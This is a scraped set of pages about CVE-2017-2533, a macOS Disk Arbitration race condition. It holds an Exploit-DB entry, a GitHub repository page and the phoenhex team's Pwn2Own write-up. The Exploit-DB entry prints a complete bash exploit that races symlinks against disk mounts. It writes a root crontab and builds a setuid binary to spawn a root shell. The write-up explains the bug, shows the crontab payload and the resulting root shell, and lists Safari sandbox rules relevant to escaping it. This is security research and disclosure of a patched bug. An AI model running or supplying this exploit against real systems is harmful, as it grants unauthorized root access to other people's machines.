[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=phoenhex%2Ffiles)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[phoenhex](/phoenhex)
/
**[files](/phoenhex/files)**
Public

* [Notifications](/login?return_to=%2Fphoenhex%2Ffiles) You must be signed in to change notification settings
* [Fork
  145](/login?return_to=%2Fphoenhex%2Ffiles)
* [Star
   524](/login?return_to=%2Fphoenhex%2Ffiles)

[524
stars](/phoenhex/files/stargazers) [145
forks](/phoenhex/files/forks) [Branches](/phoenhex/files/branches) [Tags](/phoenhex/files/tags) [Activity](/phoenhex/files/activity)
 [Star](/login?return_to=%2Fphoenhex%2Ffiles)

 [Notifications](/login?return_to=%2Fphoenhex%2Ffiles) You must be signed in to change notification settings

* [Code](/phoenhex/files)
* [Issues
  1](/phoenhex/files/issues)
* [Pull requests
  0](/phoenhex/files/pulls)
* [Actions](/phoenhex/files/actions)
* [Projects
  0](/phoenhex/files/projects)
* [Security](/phoenhex/files/security)
* [Insights](/phoenhex/files/pulse)

Additional navigation options

* [Code](/phoenhex/files)
* [Issues](/phoenhex/files/issues)
* [Pull requests](/phoenhex/files/pulls)
* [Actions](/phoenhex/files/actions)
* [Projects](/phoenhex/files/projects)
* [Security](/phoenhex/files/security)
* [Insights](/phoenhex/files/pulse)

# phoenhex/files

    master[Branches](/phoenhex/files/branches)[Tags](/phoenhex/files/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[41 Commits](/phoenhex/files/commits/master/) | | |
| [exploits](/phoenhex/files/tree/master/exploits "exploits") | | [exploits](/phoenhex/files/tree/master/exploits "exploits") |  |  |
| [pocs](/phoenhex/files/tree/master/pocs "pocs") | | [pocs](/phoenhex/files/tree/master/pocs "pocs") |  |  |
| [slides](/phoenhex/files/tree/master/slides "slides") | | [slides](/phoenhex/files/tree/master/slides "slides") |  |  |
| [README.md](/phoenhex/files/blob/master/README.md "README.md") | | [README.md](/phoenhex/files/blob/master/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README

Repository for exploits/POCs/presentation of the [phoenhex team](https://phoenhex.re/)

## About

No description, website, or topics provided.
### Resources

[Readme](#readme-ov-file)

[Activity](/phoenhex/files/activity)
[Custom properties](/phoenhex/files/custom-properties)
### Stars

[**524**
stars](/phoenhex/files/stargazers)
### Watchers

[**71**
watching](/phoenhex/files/watchers)
### Forks

[**145**
forks](/phoenhex/files/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fphoenhex%2Ffiles&report=phoenhex+%28user%29)

## [Releases](/phoenhex/files/releases)

No releases published

## [Packages 0](/orgs/phoenhex/packages?repo_name=files)

No packages published

## [Contributors 3](/phoenhex/files/graphs/contributors)

## Languages

* [C
  65.3%](/phoenhex/files/search?l=c)
* [JavaScript
  18.4%](/phoenhex/files/search?l=javascript)
* [HTML
  12.6%](/phoenhex/files/search?l=html)
* [Makefile
  1.3%](/phoenhex/files/search?l=makefile)
* [Python
  1.2%](/phoenhex/files/search?l=python)
* [Shell
  0.9%](/phoenhex/files/search?l=shell)
* Other
  0.3%

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.exploit-db.com_73b3ddf9_20250125_132354.html ===

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Apple macOS - Disk Arbitration Daemon Race Condition

#### EDB-ID:

###### 42146

#### CVE:

###### [2017-2533](https://nvd.nist.gov/vuln/detail/CVE-2017-2533)

---

**EDB Verified:**

#### Author:

###### [phoenhex](/?author=8989)

#### Type:

###### [local](/?type=local)

---

#### Platform:

###### [macOS](/?platform=macos)

#### Date:

###### 2017-06-09

---

**Vulnerable App:**

```
#!/bin/bash

# Sources:
# https://raw.githubusercontent.com/phoenhex/files/master/pocs/poc-mount.sh
# https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc

if ! security authorize system.volume.internal.mount &>/dev/null; then
  echo 2>&1 "Cannot acquire system.volume.internal.mount right. This will not work."
  exit 1
fi

TARGET=/private/var/at
SUBDIR=tabs
DISK=/dev/disk0s1

TMPDIR=/tmp/pwn
mkdir -p $TMPDIR
cd $TMPDIR

cat << EOF > boom.c
#include <assert.h>
#include <stdlib.h>
#include <unistd.h>
int main(int argc, char ** argv) {
  assert(argc == 2);
  setuid(0);
  setgid(0);
  system(argv[1]);
}
EOF
clang boom.c -o _boom || exit 1

race_link() {
  mkdir -p mounts

  while true; do
    ln -snf mounts link
    ln -snf $TARGET link
  done
}

race_mount() {
  while ! df -h | grep $TARGET >/dev/null; do
    while df -h | grep $DISK >/dev/null; do
      diskutil umount $DISK &>/dev/null
    done
    while ! df -h | grep $DISK >/dev/null; do
      diskutil mount -mountPoint $TMPDIR/link/$SUBDIR $DISK &>/dev/null
    done
  done
}

cleanup() {
  echo "Killing child process $PID and cleaning up tmp dir"
  kill -9 $PID
  rm -rf $TMPDIR
}

if df -h | grep $DISK >/dev/null; then
  echo 2>&1 "$DISK already mounted. Exiting."
  exit 1
fi

race_link &
PID=$!
trap cleanup EXIT
echo "Just imagine having that root shell. It's gonna be legen..."
race_mount

echo "wait for it..."
CMD="cp $TMPDIR/_boom $TMPDIR/boom; chmod u+s $TMPDIR/boom"
rm -f /var/at/tabs/root
echo "* * * * *" "$CMD" > /var/at/tabs/root

while ! [ -e $TMPDIR/boom ]; do
  sleep 1
done

echo "dary!"
kill -9 $PID
sleep 0.1
$TMPDIR/boom "rm /var/at/tabs/root"
$TMPDIR/boom "umount -f $DISK"
$TMPDIR/boom "rm -rf $TMPDIR; cd /; su"

```

**Tags:**
[Race Condition](/?tag=26)

**Advisory/Source:**
[Link](https://phoenhex.re/2017-06-09/pwn2own-diskarbitrationd-privesc)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from phoenhex.re_3e7a41a3_20250125_132351.html ===

[![](/imgs/header_small.jpg)](/)

* [Writeups](/)
* [Bugs](/bugs)
* [Team](/team)
* [Files](https://github.com/phoenhex/files)

# Pwn2Own: Safari sandbox part 1 â Mount yourself a root shell

Jun 9, 2017
â¢ By
[niklasb](https://twitter.com/_niklasb)

Today we have [CVE-2017-2533](https://support.apple.com/en-us/HT207797)
/ [ZDI-17-357](http://www.zerodayinitiative.com/advisories/ZDI-17-357/) for
you, a race condition in a macOS system service which could be used to escalate
privileges from local admin to root. We used it in combination with other logic
bugs to escape the Safari sandbox at this yearâs Pwn2Own competition.

The bug was in the [Disk
Arbitration](https://developer.apple.com/library/content/documentation/DriversKernelHardware/Conceptual/DiskArbitrationProgGuide/Introduction/Introduction.html)
daemon, which is responsible for managing block devices on macOS.
Its [IPC
interface](https://developer.apple.com/documentation/diskarbitration) can be
accessed from inside the Safari sandbox, which made
it an interesting target for us. By exploiting the bug, we could mount a disk
partition over any non-SIP protected directory. Since there is a small FAT32
recovery partition in every recent MacBook which the default user
is allowed to write to, this allowed us to put files with
arbitrary contents into the file system and gain root privileges.

## Bug Discovery

After achieving [code execution](/2017-05-04/pwn2own17-cachedcall-uaf)
[in the Safari renderer](/2017-06-02/arrayspread),
our goal was to laterally move to a more privileged system process, so we
started off our audit by looking at the list of allowed mach lookups, i.e.
services that we can talk to via mach IPC. The list can be found in the sandbox
rule file `/System/Library/Frameworks/WebKit.framework/Versions/A/Resources/com.apple.WebProcess.sb` and starts as follows:

```
(allow mach-lookup
       (global-name "com.apple.DiskArbitration.diskarbitrationd")
       (global-name "com.apple.FileCoordination")
       (global-name "com.apple.FontObjectsServer")
       ...

```

The first one in the list immediately caught our attention. [Disk
Arbitration](https://developer.apple.com/library/content/documentation/DriversKernelHardware/Conceptual/DiskArbitrationProgGuide/Introduction/Introduction.html)
is the Apple framework responsible for managing (primarily mounting
and unmounting) block devices, and `diskarbitrationd` is the service handling
the corresponding IPC requests. Why would a browser renderer ever need to
mount disks? That definitely warranted some further investigation.

```
$ ps aux | grep diskarbitrationd | grep -v grep
root                86   0.0  0.0  2494876   2132   ??  Ss   Wed10AM   0:00.37 /usr/libexec/diskarbitrationd
$ sudo launchctl procinfo $(pgrep diskarbitrationd) | grep sandboxed
sandboxed = no

```

So as expected, `diskarbitrationd` runs as root (it has to in order to use the `mount` syscall)
and is not sandboxed. We also verified that we could reach it from
the sandbox by writing a small client script in Swift and running it with the
`com.apple.WebProcess.sb` sandbox file using the [`sandbox-exec`](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/sandbox-exec.1.html)
tool. All this considered, it
looked like `diskarbitrationd` could be a interesting target for exploitation, so we
started auditing it. An old version of the server source code can be
downloaded from [the Apple web
site](https://opensource.apple.com/tarballs/DiskArbitration/DiskArbitration-288.1.1.tar.gz).

I was looking for memory corruption bugs at first, but soon I came across the
following code in `DARequest.c`, line 510:

```
    /*
     * Determine whether the mount point is accessible by the user.
     */

    if ( DADiskGetDescription( disk, kDADiskDescriptionVolumePathKey ) == NULL )
    {
        if ( DARequestGetUserUID( request ) )
        {
            CFTypeRef mountpoint;

            mountpoint = DARequestGetArgument2( request );
            // [...]
            if ( mountpoint )
            {
                char * path;

                path = ___CFURLCopyFileSystemRepresentation( mountpoint );

                if ( path )
                {
                    struct stat st;

                    if ( stat( path, &st ) == 0 )
                    {
                        if ( st.st_uid != DARequestGetUserUID( request ) )
                        {
                            // [[ 1 ]]
                            status = kDAReturnNotPermitted;
                        }
                    }

```

The mechanism implemented here is supposed to prevent a user with mount
privileges to mount over a directory they do not own, such as `/etc` or `/System`.
It works as follows: If the mount point exists, but is not owned by the user,
the error code `kDAReturnNotPermitted` is produced at [[ 1 ]].
Otherwise, the mount proceeds. There are no more checks after this and the mount will
succeed if the intended mount point exists and `diskarbitrationd` has sufficient
permissions to perform the mount. This is the case for all directories that are
not protected by the [*System Integrity Protection*
(SIP)](https://support.apple.com/en-us/HT204899) security mechanism.

There is an old school *time of check vs. time of use* issue here: If the mount point is created
after the check, but before the mount, the mount can succeed even if the
caller does not own the mount point.
An attacker can bypass the check by creating a symlink pointing to an arbitrary directory
between the check and the mount.

Apple has patched the bug in macOS Sierra 10.12.5, but has not released the
source code yet. We will update this post if the new source code becomes
available, and outline the patch.

## Building a local admin to root exploit

For example, we can use the bug to mount any disk over `/etc`, using
the following pseudocode:

```
disk = "/dev/some-disk-device"

in the background:
  while true:
    create symlink "/tmp/foo" pointing to "/"
    remove symlink

while disk not mounted at "/etc":
  send IPC request to diskarbitrationd to mount disk to "/tmp/foo/etc"

```

Eventually, the check will be executed while the symlink is gone, but the mount
will happen with the symlink present, so both will pass. At that point we have
mounted over `/etc`, which should not be possible for the local admin user
without at least typing the password.

Now from a privilege escalation standpoint, two problems remain:

1. Is there a disk device that is usually unmounted but writable by the
   local admin user?
2. What directory do we want to mount over that gives us code execution as root?

Problem 1 is easily solved by looking at all the physical devices:

```
$ ls -alih /dev/disk*
589 brw-r-----  1 root  operator    1,   0 Mar 15 10:27 /dev/disk0
594 brw-r-----  1 root  operator    1,   1 Mar 15 10:27 /dev/disk0s1
598 brw-r-----  1 root  operator    1,   3 Mar 15 10:27 /dev/disk0s2
596 brw-r-----  1 root  operator    1,   2 Mar 15 10:27 /dev/disk0s3
600 brw-r-----  1 root  operator    1,   4 Mar 15 10:27 /dev/disk1

```

One of them works for our purposes: `/dev/disk0s1` is the EFI partition,
a FAT32 volume used for BIOS updates on all MacBooks that we know of. It is
usually not mounted, and since it contains a FAT file system, it does not
support Unix permissions. So if we mount it as our local admin user, we can
write to it.

It might also be possible to create a block device from a disk image using
[`hdiutil`](https://developer.apple.com/legacy/library/documentation/Darwin/Reference/ManPages/man1/hdiutil.1.html)
and use it for the exploit, but I have not yet been able to get the race
condition to work in that setting.

Problem 2 took me a while to figure out. Eventually I realized that the legacy
[cron daemon](https://en.wikipedia.org/wiki/Cron) still exists on modern macOS operating systems. It is not running
by default, but when a crontab file gets created in `/var/at/tabs`, `launchd`
starts the cron daemon and it works as expected. So it suffices to
just mount our disk device over `/var/at/tabs` and write our payload to
`/var/at/tabs/root`:

```
* * * * * touch /tmp/pwned

```

The command will get executed every minute as root. At this point we have a fully
working way of going from local admin to root without typing a password. The
PoC code can be found in the file [`poc-mount.sh`](https://github.com/phoenhex/files/blob/master/pocs/poc-mount.sh) and gives
you a root shell if you have clang installed:

```
$ ./poc-mount.sh
Just imagine having that root shell. It's gonna be legen...
wait for it...
dary!
./poc-mount.sh: line 77:  3179 Killed: 9               race_link
sh-3.2# id
uid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),401(com.apple.sharepoint.group.1),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)
sh-3.2#

```

This exploit by itself is comparable to a UAC bypass on Windows and turned out
to be very useful when combined with some other bugs.

## Towards a sandbox escape

Before we can use any of the Disk Arbitration APIs, we need to first
provide an [authorization token](https://developer.apple.com/reference/security/authorization_services).
When issuing a mount request, `diskarbitrationd` will try to obtain the right
`system.volume.*.mount` using that token, where `*` depends on the type of
volume we want to mount. For example, when we request to mount the internal
disk partition `/dev/disk0s1`, `diskarbitrationd` will use the following logic
to check for authorization inside the `DAAuthorize` function from `DASupport.c`:

```
DAReturn status;

status = kDAReturnNotPrivileged;

    // ...

    AuthorizationRef authorization;

    // [[ 1 ]]
    authorization = DASessionGetAuthorization( session );

    if ( authorization )
    {
        AuthorizationFlags  flags;
        AuthorizationItem   item;
        char *              name;
        AuthorizationRights rights;

        flags = kAuthorizationFlagExtendRights;

        // ...

                        if ( DADiskGetDescription( disk, kDADiskDescriptionDeviceInternalKey ) == kCFBooleanTrue )
                        {
                            // [[ 2 ]]
                            asprintf( &name, "system.volume.internal.%s", right );
                        }

        // ...

        if ( name )
        {
            item.flags       = 0;
            item.name        = name;
            item.value       = NULL;
            item.valueLength = 0;

            rights.count = 1;
            rights.items = &item;

            // [[ 3 ]]
            status = AuthorizationCopyRights( authorization, &rights, NULL, flags, NULL );

            if ( status )
            {
                status = kDAReturnNotPrivileged;
            }

            free( name );
        }
    }

```

At [[ 1 ]], the authorization token associated with the session is fetched,
which was provided via an IPC call in advance. At [[ 2 ]], the string
`system.volume.internal.mount` is produced. At [[ 3 ]], it is checked whether
the token can be used to obtain this right via the
[`AuthorizationCopyRights`](https://developer.apple.com/reference/security/1395770-authorizationcopyrights?language=objc)
API. This API is implemented by the `com.apple.authd` service.

## Triggering the bug from Safari

Letâs see what we need to trigger this bug and what we already have
inside the sandbox:

### Access to the IPC endpoint of diskarbitrationd - CHECK

### Write access to *any* arbitrary directory - CHECK

It suffices to be able to write to just one specific directory, because while
we need to write the `root` file to the mounted disk, we can mount the disk to
that directory first, only to then umount it again and use the bug to
mount it to `/var/at/tabs`.

```
(if (positive? (string-length (param "DARWIN_USER_CACHE_DIR")))
    (allow file* (subpath (param "DARWIN_USER_CACHE_DIR"))))

```

This sandbox rule from `WebProcess.sb` gives us full write access to

```
/private/var/folders/<some-random-string>/C/com.apple.WebKit.WebContent+com.apple.Safari

```

And all of its sub-directories.

### Ability to obtain an authorization token for mounting - NOPE

While the local admin user can obtain this right in order to mount volumes,
there is a mechanism in place that prevents sandboxed processes from creating
authorization tokens with rights that the sandbox rules do not explicitly
allow. `WebProcess.sb` contains no rule of the form
`(allow authorization-right-obtain ...)`, so we cannot obtain any rights.

### Ability to create symlinks - NOPE

The Safari sandbox explicitly disallows creating symlinks:

```
(if (defined? 'vnode-type)
        (deny file-write-create (vnode-type SYMLINK)))

```

In the next part of this series we will present three more bugs, one of which we used
to create symlinks and two more to bypass the sandbox check in the
authorization logic.

show Disqus comments

[github](https://github.com/phoenhex)

![](/imgs/Twitter_logo_blue.png)
@
email


